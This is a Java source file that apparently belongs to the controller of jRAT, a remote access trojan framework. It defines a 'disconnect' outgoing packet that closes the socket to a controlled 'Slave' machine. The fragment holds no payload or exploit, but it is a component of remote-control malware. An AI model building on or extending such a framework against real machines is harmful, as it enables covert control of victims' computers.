package jrat.controller.packets.outgoing;

import jrat.controller.Slave;
import jrat.controller.exceptions.CloseException;
import java.io.DataOutputStream;


public class Packet11Disconnect extends AbstractOutgoingPacket {

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.closeSocket(new CloseException("Disconnecting"));
	}

	@Override
	public short getPacketId() {
		return 11;
	}

}
